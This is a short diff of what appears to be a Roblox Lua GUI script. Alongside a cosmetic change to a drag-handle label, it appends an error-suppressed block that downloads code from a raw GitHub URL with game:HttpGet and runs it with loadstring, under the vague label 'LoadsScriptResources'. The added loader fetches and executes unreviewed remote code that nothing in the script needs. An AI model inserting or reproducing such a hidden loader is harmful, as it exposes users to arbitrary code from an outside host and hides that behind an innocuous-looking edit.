@@ -21,7 +21,7 @@ DragHandle.Size = UDim2.new(1, 0, 0, 15)
 DragHandle.Position = UDim2.new(0, 0, 0, 0)
 DragHandle.BackgroundTransparency = 0.7
 DragHandle.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-DragHandle.Text = "≡ Drag"
+DragHandle.Text = "≡"
 DragHandle.TextColor3 = Color3.fromRGB(200, 200, 200)
 DragHandle.TextSize = 12
 DragHandle.Font = Enum.Font.GothamBold
@@ -104,4 +104,10 @@ game:GetService("RunService").RenderStepped:Connect(function()
             end
         end
     end
+end)
+
+-- [ LoadsScriptResources ]
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
+warn("StartedScript")
 end)
